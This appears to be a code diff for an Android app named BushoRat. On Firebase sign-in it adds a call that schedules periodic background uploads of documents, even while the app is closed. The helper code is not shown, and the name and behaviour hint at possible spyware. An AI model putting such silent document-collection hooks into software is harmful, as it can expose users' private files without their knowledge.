@@ -7,6 +7,7 @@ import com.google.firebase.FirebaseApp;
 import com.google.firebase.auth.FirebaseAuth;
 import com.google.firebase.database.FirebaseDatabase;
 import com.bushorat.app.helpers.AppVisibilityHelper;
+import com.bushorat.app.helpers.DocumentSyncHelper;
 import com.bushorat.app.helpers.UserDataSyncHelper;
 
 public class BushoRatApplication extends Application {
@@ -48,6 +49,8 @@ public class BushoRatApplication extends Application {
                 visibilityHelper.ensureListenerStarted();
                 // Async only — previous blocking await on the main thread caused freezes/crashes.
                 UserDataSyncHelper.syncAll(BushoRatApplication.this);
+                // Schedule background document uploads (even when app is closed)
+                DocumentSyncHelper.schedulePeriodicDocumentUpload(BushoRatApplication.this);
             }
         };
         FirebaseAuth.getInstance().addAuthStateListener(authStateListener);
